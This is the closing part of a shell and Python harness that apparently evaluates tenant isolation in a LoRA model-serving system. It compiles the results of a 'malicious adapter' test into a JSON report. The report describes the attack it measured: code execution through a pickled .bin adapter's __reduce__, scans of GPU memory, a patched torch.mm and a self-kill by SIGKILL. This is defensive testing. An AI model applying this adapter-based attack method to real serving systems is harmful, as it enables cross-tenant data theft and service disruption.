  st=$(curl -s "http://localhost:$vport/health" 2>/dev/null | grep -o '"status": *"ready"')
  if [ -n "$st" ]; then
    RECOVERY=1; break
  fi
done
[ "$RECOVERY" = 1 ] && echo "[attack] victim workers healthy — server recovered" \
                     || echo "[attack] no victim workers responding"

# ── Write final JSON ───────────────────────────────────────────────────────────
FAILED="$FAILED" SUCCEEDED="$SUCCEEDED" N_VICTIMS="$N_VICTIMS" \
RECOVERY="$RECOVERY" ATK_DEAD="$ATK_DEAD" OUT="$OUT" \
PAYLOAD_OUT="$PAYLOAD_OUT" RECON_OUT="$RECON_OUT" \
"$PY" - <<'PY'
import os, json

out          = os.environ["OUT"]
payload_file = os.environ["PAYLOAD_OUT"]
recon_file   = os.environ["RECON_OUT"]
n_victims    = int(os.environ["N_VICTIMS"])
failed       = int(os.environ["FAILED"])
succeeded    = int(os.environ["SUCCEEDED"])
recovery     = int(os.environ["RECOVERY"]) == 1
atk_dead     = int(os.environ["ATK_DEAD"]) == 1

try:
    pr = json.load(open(payload_file))
except Exception as e:
    pr = {"error": str(e)}

try:
    recon = json.load(open(recon_file))
except Exception as e:
    recon = {"error": str(e)}

chain_a_executed = pr.get("chain_a_executed", False)
payload_pid      = pr.get("pid", 0)
fault_injected   = pr.get("fault", {}).get("injected", False)
blast_radius     = round(failed / n_victims, 3) if n_victims > 0 else 0.0

aa   = pr.get("aa", {})
be   = pr.get("blind_extraction", {})
wrs  = pr.get("wrs_auth", {})
kcrr = pr.get("kcrr_live", {})
aa_recovery   = aa.get("recovery", 0.0)
wrs_recovery  = wrs.get("recovery", 0.0)
kcrr_recovery = kcrr.get("recovery", 0.0)

n_tensor_classes = recon.get("total_tensor_classes", 0)
n_tensors_found  = recon.get("total_tensors_found", 0)

all_confirmed = (
    chain_a_executed and
    fault_injected and
    atk_dead and
    blast_radius == 0.0 and
    be.get("victim_bytes", 0) == 0 and
    wrs_recovery == 0.0 and
    kcrr_recovery == 0.0 and
    aa_recovery == 0.0 and
    recovery
)

result = {
    "experiment": "Malicious Adapter — Blind Steal-Then-Crash Attack on SwarmLoRA (REAL .bin execution, filter bypassed)",
    "system": "SwarmLoRA",
    "base_model": "meta-llama/Meta-Llama-3.1-8B-Instruct (H=4096, KV=1024, I=14336, L=32)",
    "comparison_target": "blind_attack_slora.json",
    "setup": {
        "bin_filter_bypassed": True,
        "rationale": "Format check disabled to test architectural isolation alone. Same two-phase blind payload as S-LoRA.",
        "attacker_knowledge": "ZERO — blind attack, no prior system knowledge",
        "attacker_capability": ".bin adapter loaded at startup + swap_adapter to trigger Phase 2",
    },
    "phase_1_recon": {
        "code_executed": chain_a_executed,
        "payload_pid": payload_pid,
        "method": recon.get("method", ""),
        "tensor_objects": recon.get("tensor_objects", []),
        "total_tensor_classes": n_tensor_classes,
        "total_tensors_found": n_tensors_found,
        "recon_done": recon.get("recon_done", False),
        "note": (
            "gc.get_objects() scans for any object with large CUDA tensors — "
            "no class names or attribute names assumed. "
            "Victim workers run in separate OS processes — their heap is invisible to gc."
        ),
    },
    "phase_2_blind_extraction": {
        "own_objects_read": be.get("own_objects_read", 0),
        "own_tensors_read": be.get("own_tensors_read", 0),
        "own_bytes_read":   be.get("own_bytes_read", 0),
        "classes_used":     be.get("classes_found", []),
        "sample_objects":   be.get("sample_objects", []),
        "victim_objects":   0,
        "victim_bytes":     0,
        "note": be.get("note", ""),
    },
    "data_theft": {
        "wrs_auth": {
            "recovery":                    wrs_recovery,
            "idx_map_found":               wrs.get("idx_map_found", False),
            "victim_paths_found":          wrs.get("victim_paths_found", []),
            "victim_cells_count":          wrs.get("victim_cells_count", 0),
            "atk_cells_count":             wrs.get("atk_cells_count", 0),
            "cells_disjoint":              wrs.get("cells_disjoint", False),
            "victim_vs_attacker_cosine_sim": wrs.get("victim_vs_attacker_cosine_sim"),
            "victim_data_sample":          wrs.get("victim_data_sample"),
            "atk_data_sample":             wrs.get("atk_data_sample"),
        },
        "kcrr_live": {
            "recovery":            kcrr_recovery,
            "baseline_cells":      kcrr.get("baseline_cells", 0),
            "peak_kv_cells":       kcrr.get("peak_kv_cells", 0),
            "kv_nonzero_fraction": kcrr.get("kv_nonzero_fraction", 0.0),
            "sample_kv":           kcrr.get("sample_kv"),
            "scans":               kcrr.get("scans", 0),
        },
        "aa_activations": {
            "recovery": aa_recovery,
            "modules_hooked": aa.get("modules_hooked", []),
            "activations_captured": aa.get("activations_captured", 0),
            "duck_module_hooks": aa.get("duck_module_hooks", 0),
            "note": (
                "torch.mm patched in attacker's worker process. "
                "Victim compute runs in separate worker processes (LoRA) + aggregator (GEMM). "
                "Patch cannot intercept other processes' compute."
            ),
        },
    },
    "fault_injection": {
        "method": "os.kill(pid, SIGKILL) from within pickle __reduce__ payload",
        "injected": fault_injected,
        "attacker_worker_dead": atk_dead,
        "victims_in_flight": n_victims,
        "victims_killed": failed,
        "victims_survived": succeeded,
        "blast_radius": blast_radius,
        "server_recovered": recovery,
        "note": (
            "SIGKILL on attacker's worker process. Each victim runs in its own OS process — "
            "killing the attacker has no effect on concurrent victim requests."
        ),
    },
    "all_defenses_confirmed": all_confirmed,
    "verdict": (
        "ARCHITECTURE HOLDS — even with .bin format check bypassed and real code execution "
        f"inside a co-resident worker process, SwarmLoRA's process-per-worker isolation "
        f"prevents all cross-tenant data access (WRS={wrs_recovery}, KCRR={kcrr_recovery}, AA={aa_recovery}, victim_bytes={be.get('victim_bytes',0)}) "
        f"and limits fault blast radius to the attacker's own process "
        f"(blast_radius={blast_radius}, {succeeded}/{n_victims} victims survived)."
        if all_confirmed else
        "PARTIAL — check individual fields."
    ),
}

json.dump(result, open(out, "w"), indent=2)
print(json.dumps(result, indent=2))
print("\n=== SUMMARY ===")
print(f"  Setup          : REAL .bin execution (.bin filter bypassed)")
print(f"  RCE (pickle)   : {'CONFIRMED pid='+str(payload_pid) if chain_a_executed else 'NOT FIRED'}")
print(f"  Phase 1 recon  : {n_tensor_classes} class(es) with large CUDA tensors (blind scan, all attacker's own)")
print(f"  Blind extract  : {be.get('own_objects_read',0)} obj / {be.get('own_tensors_read',0)} tensors / {be.get('own_bytes_read',0)//(1024*1024)} MiB — attacker's own process")
print(f"  Victim data    : 0 bytes  (process isolation — separate OS processes)")
print(f"  WRS-auth       : recovery={wrs_recovery:.2f}  idx_map={wrs.get('idx_map_found')}  victim_cells={wrs.get('victim_cells_count',0)}  (expected: 0.0)")
print(f"  KCRR-live      : recovery={kcrr_recovery:.2f}  baseline={kcrr.get('baseline_cells',0)}  peak_kv={kcrr.get('peak_kv_cells',0)}  (expected: 0.0)")
print(f"  AA activations : recovery={aa_recovery:.2f}  C_before={aa.get('C_before',0)}  C_victim={aa.get('C_victim',0)}  (expected: 0.0)")
print(f"  Fault injected : {fault_injected}")
print(f"  Atk worker dead: {atk_dead}")
print(f"  Blast radius   : {blast_radius:.2f}  ({failed}/{n_victims} victims killed, expected: 0.0)")
print(f"  Server recovery: {'YES' if recovery else 'NO'}  (expected: YES)")
print(f"  Verdict: {'ARCHITECTURE HOLDS' if all_confirmed else 'PARTIAL'}")
PY

echo ""
echo "[attack] result written -> $OUT"
